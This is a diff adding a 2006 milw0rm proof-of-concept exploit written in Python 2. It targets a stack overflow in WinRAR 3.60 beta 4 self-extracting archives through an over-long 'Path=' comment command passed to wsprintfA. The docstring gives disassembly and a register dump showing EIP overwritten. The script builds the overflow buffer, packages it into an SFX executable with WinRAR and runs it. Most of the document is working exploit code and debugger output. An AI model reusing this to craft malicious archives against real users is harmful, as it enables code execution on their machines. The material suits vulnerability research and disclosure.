@@ -1,0 +1,132 @@
+"""
+WinRAR - Stack Overflows in SelF - eXtracting Archives
+======================================================
+
+Tested Version(s)..: WinRAR 3.60 beta 4
+Author.............: posidron
+
+An SFX (SelF-eXtracting) archive is an archive, merged with an executable
+module, which is used to extract files from the archive when executed. Thus no
+external program is necessary to extract the contents of an SFX archive, it is
+enough to execute it. Nevertheless WinRAR can work with SFX archives as with
+any other archives, so if you do not want to run a received SFX archive (for
+example, because of possible viruses), you may use WinRAR to view or extract
+its contents. SFX archives usually have .exe extension as any other executable
+file. (Quote: WinRAR Help)
+
+WinRAR distributive includes several SFX modules. All SFX modules have .sfx
+extension and must be in the same folder as WinRAR. By default WinRAR always
+uses Default.sfx module.
+
+Following commands are supported SFX commands by WinRAR, to configure the
+executable module and to provide additional informations. These commands
+will be placed in the "Comments" section within the produced package.
+
+    License=<title of the license dialog>{license text}
+    Delete=<filename>
+    Overwrite=[n]
+    Path=<path>
+    Presetup=<program /arguments>
+    Savepath
+    Setup=<program>
+    Shortcut=<DestType>,<SrcName>,<DestFolder>, <Description>,<ShortcutName>
+    Silent=[Param]
+    TempMode=[question,title]
+    Text={string}
+    Title=<title>
+
+A detailed explanation of each command can be obtained in the "WinRAR Help",
+in chapter SFX.
+
+Each command above, which take string sequences as arguments is vulnerable
+to a plain stack overflow while passing the user controled buffer through a
+wsprintfA() without bounds checking.
+
+This command allows to add a comment to an archive. The maximum comment
+length is 62000 bytes for RAR archives and 32768 bytes for ZIP archives.
+(Quote: WinRAR Help)
+
+I selected the "Path" command to do a proof of concept of this vulnerability.
+(2039 fill bytes + 4 bytes to overwrite the instruction pointer)
+
+Example:
+
+   004039B6  push  0                                ; /lParam = NULL
+=> 004039B8  push  sample.00401183                  ; |DlgProc = sample.00401183
+   004039BD  lea   edx, dword ptr ss:[ebp-24]       ; |
+   004039C0  push  0                                ; |hOwner = NULL
+   004039C2  mov   dword ptr ds:[415D78], edx       ; |
+   004039C8  lea   ecx, dword ptr ss:[ebp-3C]       ; |
+   004039CB  push  sample.00414113                  ; |pTemplate = "STARTDLG"
+   004039D0  push  ebx                              ; |hInst
+   004039D1  mov   dword ptr ds:[415D7C], ecx       ; |
+   004039D7  call  <jmp.&USER32.DialogBoxParamA>    ; \DialogBoxParamA
+........
+=> 00401183  push  ebp
+   00401184  mov   ebp, esp
+   <snip>
+   004015D0  push  eax                              ; /Path
+   004015D1  call  <jmp.&KERNEL32.SetCurrentDirecto>; \SetCurrentDirectoryA
+   004015D6  test  eax, eax
+   004015D8  jnz   short sample.00401641
+   004015DA  mov   eax, 82
+   004015DF  call  sample.004029B4
+   004015E4  push  eax                              ; /<%s>
+   004015E5  lea   edx, dword ptr ss:[ebp-2C14]     ; |
+   004015EB  push  edx                              ; |<%s>
+   004015EC  push  sample.00414132                  ; |Format = "\"%s\"\n%s"
+   004015F1  lea   ecx, dword ptr ss:[ebp-2E14]     ; |
+   004015F7  push  ecx                              ; |s
+:) 004015F8  call  <jmp.&USER32.wsprintfA>          ; \wsprintfA
+   <snip>
+
+After overflowing the "path" command:
+
+   EAX 00000000
+   ECX 766EF7A0
+   EDX 3F55EB94 ntdll.KiFastSystemCallRet
+   EBX 41414141
+   ESP 766EFFDC ASCII "BBBBBBBBBBBB"
+   EBP 00000003
+   ESI 7673DB1E ASCII "SavePath\r\n"
+   EDI 00414064 sample.00414064
+   EIP DEADBEEF
+
+The user has to open the SFX archive directly, so that nomally the GUI installer
+would popup, to trigger the vulnerability. Not by choosing the "Extract to.."
+option of WinRAR in the "right click" context menu.
+"""
+
+import os, sys
+
+winrar__ = 'C:\Programme\WinRAR\WinRAR.exe'
+sfxnfo__ = "comment.txt"
+result__ = "sample.exe"
+
+
+buf = "Path=" + "A" * 2039 + "\xef\xbe\xad\xde" + "B" * 12 + "\r\nSavePath\r\n"
+
+try:
+    info = open(sfxnfo__, "w+b")
+    info.write(buf)
+    info.close()
+except IOError:
+    sys.exit("Error: unable to create: " + sfxnfo__)
+
+try:
+    print "Creating archive:",
+    os.spawnv(os.P_WAIT, winrar__, [winrar__, "a -sfx -s " + result__ + " " + __file__])
+    os.spawnv(os.P_WAIT, winrar__, [winrar__, "c -z" + sfxnfo__ + " " + result__])
+    print "done."
+    print "Executing:",
+    # debug only!
+    os.spawnv(os.P_WAIT, result__, [result__, ""])
+    print "done."
+    print "Cleaning up:",
+    os.remove(sfxnfo__)
+    print "done."
+except OSError:
+    print "failed!"
+    sys.exit("Error: application execution failed!")
+
+# milw0rm.com [2006-07-05]
